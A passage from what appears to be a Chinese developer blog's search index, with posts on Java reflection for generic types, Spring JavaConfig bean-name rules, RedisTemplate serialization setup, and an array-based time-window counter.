IBolt.class.isAssignableFrom((Class&lt;?&gt;) ptype.getRawType()) 如果是，则直接获取参数信息 输出结果如下: 12java.lang.Stringjava.lang.Boolean 当然上面依然是存在和上面一样的问题，对于BEBolt这个类，输出的就和我们预期的不同，其输出只会有 EAbsBolt&lt;Boolean&gt; 上的信息，即到获取EAbsBolt这一层时，就结束了 1java.lang.Boolean 如果我们将上面的判定当前类是否为Ibolt.class，会输出什么呢？ 什么都没有，因为Ibolt是接口，而获取父类是获取不到接口信息的，所以判定永远走不进去 II. 进阶实现上面的基础实现中，都存在一些问题，特别是但继承结构比较复杂，深度较大时，其中又穿插着泛型类，导致不太好获取精确的类型信息，下面进行尝试探索，不保证可以成功 1. 接口实现方式主要的目标就是能正常的分析AEBolt这个case，尝试思路如下： 层层往上，直到目标接口，然后获取参数类型 改进后的实现如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152@Testpublic void testGetTypes() {// Class basicClz = ARBolt.class; Class basicClz = AEBolt.class; Type[] types; ParameterizedType ptype; types = basicClz.getGenericInterfaces(); boolean loop = false; while (true) { if (types.length == 0) { break; } for (Type type : types) { if (type instanceof Class) { if (IBolt.class.isAssignableFrom((Class&lt;?&gt;) type)) { // 即表示有一个继承了IBolt的接口，完成了IBolt的泛型参数定义 // 如: public interface ARBolt extends IBolt&lt;String, Boolean&gt; types = ((Class) type).getGenericInterfaces(); loop = true; break; } else { // 不是预期的类，直接pass掉 continue; } } ptype = (ParameterizedType) type; if (ptype.getRawType() instanceof Class) { if (!IBolt.class.isAssignableFrom((Class&lt;?&gt;) ptype.getRawType())) { continue; } if (IBolt.class.equals(ptype.getRawType())) { // 如果正好是我们需要获取的IBolt对象，则直接获取 Type[] parTypes = ptype.getActualTypeArguments(); for (Type par : parTypes) { System.out.println(par.getTypeName()); } return; } else { // 需要根据父类来获取参数信息，重新进入循环 types = ((Class) ptype.getRawType()).getGenericInterfaces(); loop = true; break; } } } if (!loop) { break; } }} 上面的实现相比较之前的负责不少，首先来看针对 AEBolt 而言，输出为 12java.lang.StringT 如果改成 ARBolt, 即RBolt这个接口在继承IBolt接口的同时，指定了参数类型，这时输出如 12java.lang.Stringjava.lang.Boolean 也就是说这个思路是可以的，唯一的问题就是当实现目标接口的某一层接口，也是泛型时，直接定位到最底层，获取的就是T,K这种符号参数了，因为实际的类型参数信息，在上一层定义的 那么有没有办法将这个参数类型传递下去呢？ 实际尝试了一下，再往下走就比较复杂了，感觉有点得不偿失，不知道是否有相关的工具类 2. 继承类方式接口方式实现之后，继承类方式也差不多了，而且相对而言会更简单一点，因为继承是单继承的 123456789101112131415161718192021222324252627282930@Testpublic void testGetAbsTypes() { Class basicClz = BEBolt.class; Type type; ParameterizedType ptype; while (true) { if (Object.class.equals(basicClz)) { break; } type = basicClz.getGenericSuperclass(); if (!(type instanceof ParameterizedType)) { basicClz = basicClz.getSuperclass(); continue; } ptype = (ParameterizedType) type; if (Object.class.equals(basicClz.getSuperclass().getSuperclass())) { // 如果ptype的父类为Object，则直接分析这个 Type[] parTypes = ptype.getActualTypeArguments(); for (Type par : parTypes) { System.out.println(par.getTypeName()); } break; } else { basicClz = basicClz.getSuperclass(); } }} 输出如下，同样有上面的问题 12java.lang.StringT III. 小结通过反射方式，后去泛型类的参数信息，有几个有意思的知识点： 获取泛型类信息 12345java.lang.Class#getGenericSuperclassjava.lang.Class#getGenericInterfaces// 获取实际的泛型参数java.lang.reflect.ParameterizedType#getActualTypeArguments Class判断继承关系 12java.lang.Class#isAssignableFrom// 父类作为调用方，子类作为参数 II. 其他一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/05/30/180530-通过反射获取泛型类的实际参数/"},{"title":"180531-Spring中JavaConfig知识小结","text":"Sring中JavaConfig使用姿势去掉xml的配置方式，改成用Java来配置，最常见的就是将xml中的 bean定义， scanner包扫描，属性文件的配置信息读取等 I. 几个基本注解1. Configuration注解在javaConfig中注解@Configuration用来代替一个xml文件，可以简单的理解他们的作用是相等的，一般bean的定义也都是放在被这个注解修饰的类中 如一个基本的配置文件如下 123456789101112131415161718192021222324252627@Configuration@ComponentScan(\"com.git.hui.rabbit.spring\")public class SpringConfig { private Environment environment; @Autowired public void setEnvironment(Environment environment) { this.environment = environment; System.out.println(\"then env: \" + environment); } @Bean(name=\"connectionFactory\") public ConnectionFactory connectionFactory() { CachingConnectionFactory factory = new CachingConnectionFactory(); factory.setHost(\"127.0.0.1\"); factory.setPort(5672); factory.setUsername(\"admin\"); factory.setPassword(\"admin\"); factory.setVirtualHost(\"/\"); return factory; } @Bean public RabbitAdmin rabbitAdmin(ConnectionFactory connectionFactory) { return new RabbitAdmin(connectionFactory); }} 2. Bean 注解上面的例子中，在方法上添加了@Bean注解，这个就相当于传统的 1&lt;bean name=\"rabbitAdmin\" class=\"org.springframework.amqp.rabbit.core.RabbitAdmin\"/&gt; 因此在需要引入rabbitAdmin实例的地方，可以如下使用 a. 属性字段上添加 @Autowired注解 1234public class RConsumer { @Autowired private RabbitAdmin rabbitAdmin;} b. 设置方法上添加 @Autowired注解 12345678public class RConsumer { private RabbitAdmin rabbitAdmin; @Autowired public void setRabbitAdmin(RabbitAdmin rabbitAdmin) { this.rabbitAdmin = rabbitAdmin; }} c. 使用构造器的方式 123456public class RConsumer { private RabbitAdmin rabbitAdmin; public RConsumer(RabbitAdmin rabbitAdmin) { this.rabbitAdmin = rabbitAdmin; }} 上面就是Spring容器支持的几种典型的IoC方式 3. ComponentScan这个类似于xml中的 &lt;context:component-scan&quot;/&gt; 标签 123@ComponentScan(\"com.git.hui.rabbit.spring\")public class SpringConfig {} 上面的这个配置，表示自动扫描包 com.git.hui.rabbit.spring 下面的bean （要求类上添加了 @Component, @Repository, @Service） 那么一个问题来了，如果一个类既被自动扫描加载，又显示定义了bean，会怎样? 12345678910111213package com.git.hui.rabbit.spring;import org.springframework.stereotype.Component;import java.util.concurrent.atomic.AtomicInteger;@Componentpublic class TestBean { private static AtomicInteger count = new AtomicInteger(1); public TestBean() { System.out.println(\"testBean count: \" + count.getAndAdd(1)); }} 对应的JavaConfig 12345678@Configuration@ComponentScan(\"com.git.hui.rabbit.spring\")public class SpringConfig { @Bean public TestBean testBean() { return new TestBean(); }} 实际测试，发现这个bean只会有一个实例，即输出计数只会有一条，实际查看ApplicationContext中的内容，TestBean的实例，也确实只有一个，如果改成下面这种场景呢 1234@Bean(name=\"testBean2\")public TestBean testBean() { return new TestBean();} 会有两条记录输出，实际查看容器中的Bean对象,会有两个实例如下 这和我们的预期也是一样的，因为一个类我可能需要多个不同的Bean实例来干一些事情 那么出现这种JavaConfig定义的beanName与自动扫描的冲突的情况会怎样呢？ 新增一个NewBean对象， 1234567public class NewBean { private static AtomicInteger count = new AtomicInteger(1); public NewBean() { System.out.println(\" newbean count: \" + count.getAndAdd(1)); }} 在JavaConfig中新加一个bean定义，但是BeanName与自动扫描的TestBean重复了 1234@Bean(name=\"testBean\")public NewBean newBean() { return new NewBean();} 此时发现有意思的事情了，从Spring容器中，将查不到TestBean的实例，但是可以查到NewBean的实例 这个的表现是： 当beanName出现冲突时，JavaConfig的优先级会高于自动加载的，导致自动加载的Bean不会被加载到容器内 那么跟着来的一个问题就是如果JavaConfig中定义了两个相同的BeanName的bean呢? 123456789@Bean(name = \"testBean2\")public NewBean newBean() { return new NewBean();}@Bean(name = \"testBean2\")public TestBean testBean() { return new TestBean();} 因为我们TestBean上加了@Component注解,因此容器中至少有一个，但是否会有testBean2这个实例呢？ 通过实际查看是没有的，testBean2这个名被 NewBean 占领了 so，表现上看，加上实测，将上面的定义换个位置，得出下面的结论 当出现beanName重名时，先定义的Bean占优 然后就是最后一个问题了，当自动扫描时，两个类包不同，但是类名相同，会怎样？ 12345678910111213package com.git.hui.rabbit.spring.demo;import org.springframework.stereotype.Component;import java.util.concurrent.atomic.AtomicInteger;@Componentpublic class TestBean { private static AtomicInteger count = new AtomicInteger(1); public TestBean() { System.out.println(\" demo.TestBean count: \" + count.getAndAdd(1)); }} 实测，会抛出一个异常，在使用xml的配置方式时，经常见到的一个BeanName冲突的异常 1org.springframework.context.annotation.ConflictingBeanDefinitionException: Annotation-specified bean name 'testBean' for bean class [com.git.hui.rabbit.spring.demo.TestBean] conflicts with existing, non-compatible bean definition of same name and class [com.git.hui.rabbit.spring.TestBean] 小结： JavaConfig 定义的BeanName与自动扫描的BeanName冲突时，JavaConfig的定义的会被实例化 JavaConfig 中定义了BeanName相同的Bean时，优先定义的有效（这里不抛异常不太能理解） 自动扫描的Bean，不支持类名相同，但是包路径不同的场景（会抛异常） 4. Import在xml配置中，另一个常见的case就是引入另一个xml配置，在JavaConfig中代替的就是Import注解 12345@Configuration@ComponentScan(\"com.git.hui.rabbit.spring\")@Import({DirectConsumerConfig.class, FanoutConsumerConfig.class, TopicConsumerConfig.class})public class SpringConfig {} 这个就等同于xml中常见的： 1&lt;import resource=\"service.xml\" /&gt; II. 实例测试1. xml单测姿势上面说了用JavaConfig代替xml配置的方式，另一个关键的地方就是测试用例的写法了，对于之前的xml，有两种常见的使用姿势 case1: 注解方式 1234@RunWith(SpringJUnit4ClassRunner.class)@ContextConfiguration(\"classpath*:*.xml\")public class BeanTest {} case2: 主动加载容器方式 1234567private ServiceA serviceA;@Beforepublic void init() { ApplicationContext apc = new ClassPathXmlApplicationContext(\"classpath:*.xml\"); serviceA = (ServiceA) apc.getBean(\"serviceA\");} 2. JavaConfig单测使用姿势那么替换成JavaConfig的用法，也有两种 case1: 注解方式，指定内部classes值 1234@RunWith(SpringJUnit4ClassRunner.class)@ContextConfiguration(classes = SpringConfig.class)public class SprintUnit {} case2: 主动加载容器，改为AnnotationConfigApplicationContext 123456@Testpublic void testServiceA() { ApplicationContext context = new AnnotationConfigApplicationContext(BeansConfiguration.class); ServiceA serviceA = (ServiceA) context.getBean(\"serviceA\"); serviceA.print();} III. 小结1. 注解映射关系JavaConfig方式基本上采用的是替换的思路来取代xml，即原xml中的一些东西，可以直接通过注解来代替，如 @Configuration 修饰类，与传统的xml文件作用相同 @Bean注解，修饰方法，表示声明一个Bean，与原来的xml中的 &lt;bean&gt; 标签作用相同 @ComponentScan注解，自动扫描包，类似xml中的 &lt;context:component-scan&gt; @Import注解，与xml中的&lt;import&gt;标签类似，引入其他的配置信息 2. BeanName重名规则在实际使用中，有一点需要额外注意，对于beanName相同的情况，通过测试的规则如下（没有看源码，不保证完全准确，仅为测试后得出的依据）： JavaConfig 定义的BeanName与自动扫描的BeanName冲突时，JavaConfig的定义的会被实例化 JavaConfig 中定义了BeanName相同的Bean时，优先定义的有效（这里不抛异常不太能理解） 自动扫描的Bean，不支持类名相同，但是包路径不同的场景（会抛异常） 3. 测试姿势最简单的就是修改原来的注解@ContextConfiguration中的值 1@ContextConfiguration(classes = SpringConfig.class) II. 其他一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/05/31/180531-Spring中JavaConfig知识小结/"},{"title":"180611-Spring之RedisTemplate配置与使用","text":"Spring之RedisTemplate配置与使用Spring针对Redis的使用，封装了一个比较强大的Template以方便使用；之前在Spring的生态圈中也使用过redis，但直接使用Jedis进行相应的交互操作，现在正好来看一下RedisTemplate是怎么实现的，以及使用起来是否更加便利 I. 基本配置1. 依赖依然是采用Jedis进行连接池管理，因此除了引入 spring-data-redis之外，再加上jedis依赖，pom文件中添加 1234567891011&lt;dependency&gt; &lt;groupId&gt;org.springframework.data&lt;/groupId&gt; &lt;artifactId&gt;spring-data-redis&lt;/artifactId&gt; &lt;version&gt;1.8.4.RELEASE&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;redis.clients&lt;/groupId&gt; &lt;artifactId&gt;jedis&lt;/artifactId&gt; &lt;version&gt;2.9.0&lt;/version&gt;&lt;/dependency&gt; 如果需要指定序列化相关参数，也可以引入jackson，本篇为简单入门级，就不加这个了 2. 配置文件准备redis相关的配置参数，常见的有host, port, password, timeout…，下面是一份简单的配置，并给出了相应的含义 12345678910111213141516171819202122redis.hostName=127.0.0.1redis.port=6379redis.password=https://blog.hhui.top# 连接超时时间redis.timeout=10000#最大空闲数redis.maxIdle=300#控制一个pool可分配多少个jedis实例,用来替换上面的redis.maxActive,如果是jedis 2.4以后用该属性redis.maxTotal=1000#最大建立连接等待时间。如果超过此时间将接到异常。设为-1表示无限制。redis.maxWaitMillis=1000#连接的最小空闲时间 默认1800000毫秒(30分钟)redis.minEvictableIdleTimeMillis=300000#每次释放连接的最大数目,默认3redis.numTestsPerEvictionRun=1024#逐出扫描的时间间隔(毫秒) 如果为负数,则不运行逐出线程, 默认-1redis.timeBetweenEvictionRunsMillis=30000#是否在从池中取出连接前进行检验,如果检验失败,则从池中去除连接并尝试取出另一个redis.testOnBorrow=true#在空闲时检查有效性, 默认falseredis.testWhileIdle=true 说明 redis密码请一定记得设置，特别是在允许远程访问的时候，如果没有密码，默认端口号，很容易就被是扫描注入脚本，然后开始给人挖矿（亲身经历…） II. 使用与测试根据一般的思路，首先是得加载上面的配置，创建redis连接池，然后再实例化RedisTemplate对象，最后持有这个实力开始各种读写操作 1. 配置类使用JavaConfig的方式来配置，主要是两个Bean，读取配置文件设置各种参数的RedisConnectionFactory以及预期的RedisTemplate 1234567891011121314151617181920212223242526272829303132333435@Configuration@PropertySource(\"classpath:redis.properties\")public class RedisConfig extends JCacheConfigurerSupport { @Autowired private Environment environment; @Bean public RedisConnectionFactory redisConnectionFactory() { JedisConnectionFactory fac = new JedisConnectionFactory(); fac.setHostName(environment.getProperty(\"redis.hostName\")); fac.setPort(Integer.parseInt(environment.getProperty(\"redis.port\"))); fac.setPassword(environment.getProperty(\"redis.password\")); fac.setTimeout(Integer.parseInt(environment.getProperty(\"redis.timeout\"))); fac.getPoolConfig().setMaxIdle(Integer.parseInt(environment.getProperty(\"redis.maxIdle\"))); fac.getPoolConfig().setMaxTotal(Integer.parseInt(environment.getProperty(\"redis.maxTotal\"))); fac.getPoolConfig().setMaxWaitMillis(Integer.parseInt(environment.getProperty(\"redis.maxWaitMillis\"))); fac.getPoolConfig().setMinEvictableIdleTimeMillis( Integer.parseInt(environment.getProperty(\"redis.minEvictableIdleTimeMillis\"))); fac.getPoolConfig() .setNumTestsPerEvictionRun(Integer.parseInt(environment.getProperty(\"redis.numTestsPerEvictionRun\"))); fac.getPoolConfig().setTimeBetweenEvictionRunsMillis( Integer.parseInt(environment.getProperty(\"redis.timeBetweenEvictionRunsMillis\"))); fac.getPoolConfig().setTestOnBorrow(Boolean.parseBoolean(environment.getProperty(\"redis.testOnBorrow\"))); fac.getPoolConfig().setTestWhileIdle(Boolean.parseBoolean(environment.getProperty(\"redis.testWhileIdle\"))); return fac; } @Bean public RedisTemplate&lt;String, String&gt; redisTemplate(RedisConnectionFactory redisConnectionFactory) { RedisTemplate&lt;String, String&gt; redis = new RedisTemplate&lt;&gt;(); redis.setConnectionFactory(redisConnectionFactory); redis.afterPropertiesSet(); return redis; }} 2. 测试与使用12345678910111213141516171819@RunWith(SpringJUnit4ClassRunner.class)@ContextConfiguration(classes = {RedisConfig.class})public class RedisTest { @Autowired private RedisTemplate&lt;String, String&gt; redisTemplate; @Test public void testRedisObj() { Map&lt;String, Object&gt; properties = new HashMap&lt;&gt;(); properties.put(\"123\", \"hello\"); properties.put(\"abc\", 456); redisTemplate.opsForHash().putAll(\"hash\", properties); Map&lt;Object, Object&gt; ans = redisTemplate.opsForHash().entries(\"hash\"); System.out.println(\"ans: \" + ans); }} 执行后输出如下 1ans: {123=hello, abc=456} 从上面的配置与实现来看，是很简单的了，基本上没有绕什么圈子，但是使用redis-cli连上去，却查询不到 hash 这个key的内容 1234127.0.0.1:6379&gt; get hash(nil)127.0.0.1:6379&gt; keys *1) \"\\xac\\xed\\x00\\x05t\\x00\\x04hash\" 使用代码去查没问题，直接控制台连接，发现这个key和我们预期的不一样，多了一些前缀，why ? 3. 序列化问题为了解决上面的问题，只能debug进去，看下是什么引起的了 对应源码位置: 123456// org.springframework.data.redis.core.AbstractOperations#rawKeybyte[] rawKey(Object key) { Assert.notNull(key, \"non null key required\"); return this.keySerializer() == null &amp;&amp; key instanceof byte[] ? (byte[])((byte[])key) : this.keySerializer().serialize(key);} 可以看到这个key不是我们预期的 key.getBytes(), 而是调用了this.keySerializer().serialize(key)，而debug的结果，默认Serializer是JdkSerializationRedisSerializer 然后就是顺藤摸瓜一步一步深入进去，链路如下 123456789101112131415161718// org.springframework.core.serializer.support.SerializingConverter#convert// org.springframework.core.serializer.DefaultSerializer#serializepublic class DefaultSerializer implements Serializer&lt;Object&gt; { public DefaultSerializer() { } public void serialize(Object object, OutputStream outputStream) throws IOException { if (!(object instanceof Serializable)) { throw new IllegalArgumentException(this.getClass().getSimpleName() + \" requires a Serializable payload but received an object of type [\" + object.getClass().getName() + \"]\"); } else { ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream); objectOutputStream.writeObject(object); objectOutputStream.flush(); } }} 所以具体的实现很清晰了，就是 ObjectOutputStream,这个东西就是Java中最原始的序列化反序列流工具，会包含类型信息，所以会带上那串前缀了 所以要解决这个问题，也比较明确了，替换掉原生的JdkSerializationRedisSerializer,改为String的方式，正好提供了一个StringRedisSerializer,所以在RedisTemplate的配置处，稍稍修改 123456789101112131415@Beanpublic RedisTemplate&lt;String, String&gt; redisTemplate(RedisConnectionFactory redisConnectionFactory) { RedisTemplate&lt;String, String&gt; redis = new RedisTemplate&lt;&gt;(); redis.setConnectionFactory(redisConnectionFactory); // 设置redis的String/Value的默认序列化方式 StringRedisSerializer stringRedisSerializer = new StringRedisSerializer(); redis.setKeySerializer(stringRedisSerializer); redis.setValueSerializer(stringRedisSerializer); redis.setHashKeySerializer(stringRedisSerializer); redis.setHashValueSerializer(stringRedisSerializer); redis.afterPropertiesSet(); return redis;} 再次执行，结果尴尬的事情出现了，抛异常了，类型转换失败 123456java.lang.ClassCastException: java.lang.Integer cannot be cast to java.lang.String at org.springframework.data.redis.serializer.StringRedisSerializer.serialize(StringRedisSerializer.java:33) at org.springframework.data.redis.core.AbstractOperations.rawHashValue(AbstractOperations.java:171) at org.springframework.data.redis.core.DefaultHashOperations.putAll(DefaultHashOperations.java:129) ... 看前面的测试用例，map中的value有integer，而StringRedisSerializer接收的参数必须是String，所以不用这个，自己照样子重新写一个兼容掉 123456789101112131415161718192021222324public class DefaultStrSerializer implements RedisSerializer&lt;Object&gt; { private final Charset charset; public DefaultStrSerializer() { this(Charset.forName(\"UTF8\")); } public DefaultStrSerializer(Charset charset) { Assert.notNull(charset, \"Charset must not be null!\"); this.charset = charset; } @Override public byte[] serialize(Object o) throws SerializationException { return o == null ? null : String.valueOf(o).getBytes(charset); } @Override public Object deserialize(byte[] bytes) throws SerializationException { return bytes == null ? null : new String(bytes, charset); }} 然后可以开始愉快的玩耍了,执行完之后测试 12345678keys *1) \"\\xac\\xed\\x00\\x05t\\x00\\x04hash\"2) \"hash\"127.0.0.1:6379&gt; hgetAll hash1) \"123\"2) \"hello\"3) \"abc\"4) \"456\" III. RedisTemplate使用姿势1. opsForXXX简单过来一下RedisTemplate的使用姿势，针对不同的数据结构(String, List, ZSet, Hash）读封装了比较使用的调用方式 opsForXXX 1234567891011121314// hash 数据结构操作org.springframework.data.redis.core.RedisTemplate#opsForHash// listorg.springframework.data.redis.core.RedisTemplate#opsForList// stringorg.springframework.data.redis.core.RedisTemplate#opsForValue// setorg.springframework.data.redis.core.RedisTemplate#opsForSet// zsetorg.springframework.data.redis.core.RedisTemplate#opsForZSet 2. execute除了上面的这种使用方式之外，另外一种常见的就是直接使用execute了，一个简单的case如下 123456789101112131415161718192021222324@Testpublic void testRedis() { String key = \"hello\"; String value = \"world\"; redisTemplate.execute((RedisCallback&lt;Void&gt;) con -&gt; { con.set(key.getBytes(), value.getBytes()); return null; }); String asn = redisTemplate.execute((RedisCallback&lt;String&gt;) con -&gt; new String(con.get(key.getBytes()))); System.out.println(asn); String hkey = \"hKey\"; redisTemplate.execute((RedisCallback&lt;Void&gt;) con -&gt; { con.hSet(hkey.getBytes(), \"23\".getBytes(), \"what\".getBytes()); return null; }); Map&lt;byte[], byte[]&gt; map = redisTemplate.execute((RedisCallback&lt;Map&lt;byte[], byte[]&gt;&gt;) con -&gt; con.hGetAll(hkey.getBytes())); for (Map.Entry&lt;byte[], byte[]&gt; entry : map.entrySet()) { System.out.println(\"key: \" + new String(entry.getKey()) + \" | value: \" + new String(entry.getValue())); }} 输出结果如下 12worldkey: 23 | value: what 3. 区别一个自然而然能想到的问题就是上面的两种方式有什么区别？ opsForXXX 的底层，就是通过调用execute方式来做的，其主要就是封装了一些使用姿势，定义了序列化，使用起来更加的简单和便捷； IV. 其他0. 项目 study-demo/spring-redis 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/06/11/180611-Spring之RedisTemplate配置与使用/"},{"title":"180621-一个简单的时间窗口设计与实现","text":"如何设计一个计数的时间窗口时间窗口，通常对于一些实时信息展示中用得比较多，比如维持一个五分钟的交易明细时间窗口，就需要记录当前时间，到五分钟之前的所有交易明细，而五分钟之前的数据，则丢掉 一个简单的实现就是用一个队列来做，新的数据在对头添加；同时起一个线程，不断的询问队尾的数据是否过期，如果过期则丢掉 另外一中场景需要利用到这个时间窗口内的数据进行计算，如计算着五分钟交易中资金的流入流出总和，如果依然用上面的这种方式，会有什么问题？ 如果时间窗口大，需要存储大量的明细数据 我们主要关心的只有资金流入流出；存这些明细数据得不偿失 每次新增or删除过期数据时，实时计算流入流出消耗性能 针对这种特殊的场景，是否有什么取巧的实现方式呢？ I. 方案设计1. 基于队列的轮询删除方式将时间窗口分割成一个一个的时间片，每个时间片中记录资金的流入流出总数，然后总的流入流出就是所有时间片的流入流出的和 新增数据： 若未跨时间片，则更新队头的值 若跨时间片，新增一个队列头 删除数据： 轮询任务，判断队列尾是否过期 队尾过期，则删除队尾，此时若队头数据未加入计算，也需要加入计算 2. 基于队列的新增时删除方式相比较前面的轮询方式，这个的应用场景为另外一种，只有在新增数据时，确保数据的准确性即可，不需要轮询的任务去删除过期的数据 简单来说，某些场景下（比如能确保数据不会断续的进来，即每个时间片都至少有一个数据过来），此时希望我的时间窗口数据是由新增的数据来驱动并更新 新增数据： 未跨时间片，则更新队头值 跨时间片，新塞入一个，并删除旧的数据 II. 基于数组的时间窗口实现针对上面第二种，基于数组给出一个简单的实现，本篇主要是给出一个基础的时间窗口的设计与实现方式，当然也需要有进阶的case，比如上面的资金流入流出中，我需要分别计算5min,10min,30min,1h,3h,6h,12h,24h的时间窗口，该怎么来实现呢？能否用一个队列就满足所有的时间窗口的计算呢？关于这些留待下一篇给出 1. 时间轮计算器前面用队列的方式比较好理解，这里为什么用数组方式来实现？ 固定长度，避免频繁的新增和删除对象 定位和更新数据方便 首先是需要实现一个时间轮计算器，根据传入的时间，获取需要删除的过期数据 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667@Datapublic class TimeWheelCalculate { private static final long START = 0; private int period; private int length; /** * 划分的时间片个数 */ private int cellNum; private void check() { if (length % period != 0) { throw new IllegalArgumentException( \"length % period should be zero but not! now length: \" + length + \" period: \" + period); } } public TimeWheelCalculate(int period, int length) { this.period = period; this.length = length; check(); this.cellNum = length / period; } public int calculateIndex(long time) { return (int) ((time - START) % length / period); } /** * 获取所有过期的时间片索引 * * @param lastInsertTime 上次更新时间轮的时间戳 * @param nowInsertTime 本次更新时间轮的时间戳 * @return */ public List&lt;Integer&gt; getExpireIndexes(long lastInsertTime, long nowInsertTime) { if (nowInsertTime - lastInsertTime &gt;= length) { // 已经过了一轮，过去的数据全部丢掉 return null; } List&lt;Integer&gt; removeIndexList = new ArrayList&lt;&gt;(); int lastIndex = calculateIndex(lastInsertTime); int nowIndex = calculateIndex(nowInsertTime); if (lastIndex == nowIndex) { // 还没有跨过这个时间片，则不需要删除过期数据 return Collections.emptyList(); } else if (lastIndex &lt; nowIndex) { for (int tmp = lastIndex; tmp &lt; nowIndex; tmp++) { removeIndexList.add(tmp); } } else { for (int tmp = lastIndex; tmp &lt; cellNum; tmp++) { removeIndexList.add(tmp); } for (int tmp = 0; tmp &lt; nowIndex; tmp++) { removeIndexList.add(tmp); } } return removeIndexList; }} 这个计算器的实现比较简单，首先是指定时间窗口的长度(length),时间片(period)，其主要提供两个方法 calculateIndex 根据当前时间，确定过期的数据在数组的索引 getExpireIndexes 根据上次插入的时间，和当前插入的时间，计算两次插入时间之间，所有的过期数据索引 2. 时间轮容器容器内保存的时间窗口下的数据，包括实时数据，和过去n个时间片的数组，其主要的核心就是在新增数据时，需要判断 若跨时间片，则删除过期数据，更新实时数据，更新总数 若未跨时间片，则直接更新实时数据即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172@Datapublic class TimeWheelContainer { private TimeWheelCalculate calculate; /** * 历史时间片计数，每个时间片对应其中的一个元素 */ private int[] counts; /** * 实时的时间片计数 */ private int realTimeCount; /** * 整个时间轮计数 */ private int timeWheelCount; private Long lastInsertTime; public TimeWheelContainer(TimeWheelCalculate calculate) { this.counts = new int[calculate.getCellNum()]; this.calculate = calculate; this.realTimeCount = 0; this.timeWheelCount = 0; this.lastInsertTime = null; } public void add(long now, int amount) { if (lastInsertTime == null) { realTimeCount = amount; lastInsertTime = now; return; } List&lt;Integer&gt; removeIndex = calculate.getExpireIndexes(lastInsertTime, now); if (removeIndex == null) { // 两者时间间隔超过一轮，则清空计数 realTimeCount = amount; lastInsertTime = now; timeWheelCount = 0; clear(); return; } if (removeIndex.isEmpty()) { // 没有跨过时间片，则只更新实时计数 realTimeCount += amount; lastInsertTime = now; return; } // 跨过了时间片，则需要在总数中删除过期的数据，并追加新的数据 for (int index : removeIndex) { timeWheelCount -= counts[index]; counts[index] = 0; } timeWheelCount += realTimeCount; counts[calculate.calculateIndex(lastInsertTime)] = realTimeCount; lastInsertTime = now; realTimeCount = amount; } private void clear() { for (int i = 0; i &lt; counts.length; i++) { counts[i] = 0; } }} 3. 测试主要就是验证上面的实现有没有明显的问题，为什么是明显的问题？ 深层次的bug在实际的使用中，更容易暴露 1234567891011121314151617181920212223242526272829303132333435363738394041424344public class CountTimeWindow { public static void main(String[] args) { TimeWheelContainer timeWheelContainer = new TimeWheelContainer(new TimeWheelCalculate(2, 20)); timeWheelContainer.add(0, 1); Assert.isTrue(timeWheelContainer.getTimeWheelCount() == 0, \"first\"); timeWheelContainer.add(1, 1); Assert.isTrue(timeWheelContainer.getTimeWheelCount() == 0, \"first\"); timeWheelContainer.add(2, 1); Assert.isTrue(timeWheelContainer.getTimeWheelCount() == 2, \"second\"); Assert.isTrue(timeWheelContainer.getCounts()[0] == 2, \"second\"); for (int i = 3; i &lt; 20; i++) { timeWheelContainer.add(i, 1); System.out.println(\"add index: \" + i + \" count: \" + timeWheelContainer.getTimeWheelCount()); } // 刚好一轮 timeWheelContainer.add(20, 3); Assert.isTrue(timeWheelContainer.getTimeWheelCount() == 20, \"third\"); timeWheelContainer.add(21, 3); Assert.isTrue(timeWheelContainer.getTimeWheelCount() == 20, \"third\"); // 减去过期的那个数据 timeWheelContainer.add(22, 3); Assert.isTrue(timeWheelContainer.getTimeWheelCount() == 26 - 2, \"fourth\"); Assert.isTrue(timeWheelContainer.getCounts()[0] == 6, \"fourth\"); timeWheelContainer.add(26, 3); Assert.isTrue(timeWheelContainer.getTimeWheelCount() == 24 - 2 - 2 + 3, \"fifth\"); System.out.println(Arrays.toString(timeWheelContainer.getCounts())); timeWheelContainer.add(43, 3); System.out.println(Arrays.toString(timeWheelContainer.getCounts())); Assert.isTrue(timeWheelContainer.getTimeWheelCount() == 6, \"six\"); }} III. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/06/21/180621-一个简单的时间窗口设计与实现/"},{"title":"180701-计数时间窗口数据结构的设计","text":"相关博文: 180625-关于时间窗口的想法 180621-一个简单的时间窗口设计与实现 维持计数时间窗口数据结构的设计I. 背景有这么一个场景，我需要维护每个商品在3min, 10mn, 1h, 6h, 24h这几个时间窗口内的贸易总额，那么可以怎么实现？ 问题拆解： 每个商品，对应多个时间窗口 商品可能很多，因此时间窗口的量可能很大 时间窗口的数据为总数，因此不需要记录每个订单的情况，只需要维护一个交易总额即可 热点数据，可能每分钟都有很多的成交 冷门数据，可能一天都没有几笔成交 说明： 